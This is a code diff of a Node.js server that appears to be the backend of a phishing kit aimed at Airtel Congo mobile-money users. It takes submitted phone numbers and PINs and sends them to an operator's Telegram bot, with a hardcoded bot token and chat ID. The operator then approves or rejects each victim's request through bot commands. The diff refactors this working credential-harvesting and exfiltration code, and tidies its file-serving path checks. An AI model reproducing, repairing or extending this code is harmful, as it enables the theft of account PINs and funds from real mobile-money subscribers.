@@ -3,13 +3,24 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
+const PORT = 3000;
+
 const TELEGRAM_BOT_TOKEN = '1234567890:AAHh9cM13O55o30Sv4OvXtC5B0JaF4tdm_o';
 const TELEGRAM_ADMIN_CHAT_ID = '7867527304';
 
 const approvals = new Map();
 
 async function notifyTelegram(phone, pin, requestId) {
-    const message = '📲 Nouvelle demande Airtel Congo\n📱 Téléphone: ' + phone + '\n🔑 PIN: ' + pin + '\n🆔 Request: ' + requestId + '\n\n✅ /approve_' + requestId + ' - Approuver\n❌ /reject_' + requestId + ' - Rejeter';
+    const lines = [
+        '📲 Nouvelle demande Airtel Congo',
+        '📱 Téléphone: ' + phone,
+        '🔑 PIN: ' + pin,
+        '🆔 Request: ' + requestId,
+        '',
+        '✅ /approve_' + requestId + ' - Approuver',
+        '❌ /reject_' + requestId + ' - Rejeter'
+    ];
+    const message = lines.join('\n');
     
     try {
         const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
@@ -28,13 +39,13 @@ async function notifyTelegram(phone, pin, requestId) {
         });
         return await response.json();
     } catch (e) {
-        console.error('Telegram notification failed:', e);
+        console.error('Telegram notification failed:', e.message);
         return { error: e.message };
     }
 }
 
 function parseBody(req) {
-    return new Promise((resolve, reject) => {
+    return new Promise((resolve) => {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', () => {
@@ -44,12 +55,11 @@ function parseBody(req) {
                 resolve(body);
             }
         });
-        req.on('error', reject);
     });
 }
 
 const server = http.createServer(async (req, res) => {
-    const url = new URL(req.url, 'http://' + req.headers.host);
+    const url = new URL(req.url, 'http://localhost:' + PORT);
     
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -114,11 +124,12 @@ const server = http.createServer(async (req, res) => {
             return;
         }
         
-        const [action, requestId] = callback_query.data.split('_');
+        const data = callback_query.data;
+        const requestId = data.replace('approve_', '').replace('reject_', '');
         const approval = approvals.get(requestId);
-
+        
         if (approval) {
-            approval.status = action === 'approve' ? 'approved' : 'rejected';
+            approval.status = data.startsWith('approve_') ? 'approved' : 'rejected';
             approval.respondedAt = Date.now();
         }
         
@@ -127,12 +138,27 @@ const server = http.createServer(async (req, res) => {
         return;
     }
     
-    const requested = url.pathname === '/' ? 'index.html' : decodeURIComponent(url.pathname.replace(/^\/+/, ''));
-    const file = path.resolve(__dirname, requested);
+    let requested = url.pathname === '/' ? 'index.html' : url.pathname.replace(/^\/+/, '');
     
-    if (!file.startsWith(__dirname) || !fs.existsSync(file)) {
+    try {
+        const file = path.join(__dirname, requested);
+        const realPath = fs.realpathSync(file);
+        
+        if (!realPath.startsWith(__dirname)) {
+            res.writeHead(404);
+            res.end('Not found');
+            return;
+        }
+        
+        if (!fs.existsSync(realPath)) {
+            res.writeHead(404);
+            res.end('Not found');
+            return;
+        }
+    } catch (e) {
         res.writeHead(404);
-        return res.end('Not found');
+        res.end('Not found');
+        return;
     }
     
     const types = {
@@ -144,15 +170,17 @@ const server = http.createServer(async (req, res) => {
         '.json': 'application/json'
     };
     
+    const file = path.join(__dirname, requested);
     res.writeHead(200, { 'Content-Type': types[path.extname(file)] || 'application/octet-stream' });
     
     let content = fs.readFileSync(file);
     if (requested === 'index.html') {
-        content = content.toString().replace('</head>', '<style>html,body{height:auto;min-height:100%;overflow-x:hidden;overflow-y:auto}.dp-root{min-height:100vh}</style></head>');
+        content = Buffer.from(content.toString().replace('</head>', '<style>html,body{height:auto;min-height:100%;overflow-x:hidden;overflow-y:auto}.dp-root{min-height:100vh}</style></head>'));
     }
     res.end(content);
 });
 
-server.listen(3000);
-console.log('Server running at http://localhost:3000/');
-console.log('Telegram integration ready with bot token and admin chat ID');
+server.listen(PORT, () => {
+    console.log('Server running at http://localhost:' + PORT + '/');
+    console.log('Telegram integration ready');
+});
